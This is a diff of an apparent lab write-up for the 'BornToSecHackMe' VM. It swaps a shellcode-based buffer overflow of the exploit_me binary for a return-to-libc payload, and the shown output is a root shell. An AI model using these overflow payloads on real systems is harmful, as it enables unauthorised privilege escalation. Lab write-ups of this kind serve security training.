@@ -396,13 +396,7 @@ then we decompile the exploit_me and found that there is a strcpy inside.
 We used it to do a buffer overflow with this command :
 
 ```
-az@BornToSecHackMe:~$
-zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print "\x90" * 35 + "\x31\xc0\x83\xec\x01\x88\x04\x24\x68\x2f\x7a\x73\x68\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe6\x50\x56\xb0\x0b\x89\xf3\x89\xe1\x31\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80\x83\xc4\x10\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "\x88\xf8\xff\xbf" * 2')
-�����������������������������������1����$h/zshh/binh/usr��PV�
-                                                             ���1�̀�1�̀��1�1۰̀Sh/ttyh/dev��1�f�'�̀1�Ph//shh/bin��PS�ᙰ
-                                                                                                                  ̀��������
-# ls
-exploit_me  mail
+#./exploit_me $(python -c "print('X' * 140 + '\x60\xb0\xe6\xb7' + 'D' * 4 + '\x58\xcc\xf8\xb7')")
 # whoami
 root
 ```
